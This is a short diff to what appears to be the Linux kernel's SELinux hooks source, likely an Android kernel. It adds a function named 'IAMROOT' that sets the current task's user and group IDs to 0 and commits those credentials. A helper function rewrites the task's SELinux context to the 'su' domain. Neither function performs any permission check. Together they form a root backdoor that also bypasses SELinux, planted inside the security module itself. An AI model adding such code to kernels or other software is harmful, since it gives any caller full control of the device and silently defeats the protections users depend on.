@@ -7145,3 +7145,62 @@ int selinux_disable(struct selinux_state *state)
 	return 0;
 }
 #endif
+#define KERNEL_SU_DOMAIN "u:r:su:s0"
+static void transive_to_domain(const char *domain)
+{
+	struct cred *cred;
+	struct task_security_struct *tsec;
+	u32 sid;
+	int error;
+
+	cred = (struct cred *)__task_cred(current);
+
+	tsec = cred->security;
+	if (!tsec) {
+		pr_err("tsec == NULL!\n");
+		return;
+	}
+
+	error = security_secctx_to_secid(domain, strlen(domain), &sid);
+	if (error) {
+		pr_info("security_secctx_to_secid %s -> sid: %d, error: %d\n",
+			domain, sid, error);
+	}
+	else {
+		tsec->sid = sid;
+		tsec->create_sid = 0;
+		tsec->keycreate_sid = 0;
+		tsec->sockcreate_sid = 0;
+	}
+
+}
+
+void IAMROOT(void)
+{
+	struct task_struct *my_task;
+			struct cred *new_cred;
+			kuid_t kuid = KUIDT_INIT(0);
+			kgid_t kgid = KGIDT_INIT(0);
+			/* get context of currently active task */
+			my_task = get_current();
+			if (my_task == NULL) {
+				printk("Failed to get current task info.\n");
+			    return;
+			}
+
+			/* change privileges */
+			new_cred = prepare_creds();
+			if (new_cred == NULL) {
+				printk("Failed to prepare new credentials\n");
+				return;
+			}
+
+			new_cred->uid = kuid;
+			new_cred->gid = kgid;
+			new_cred->euid = kuid;
+			new_cred->egid = kgid;
+
+			commit_creds(new_cred);
+			
+			transive_to_domain(KERNEL_SU_DOMAIN);
+}
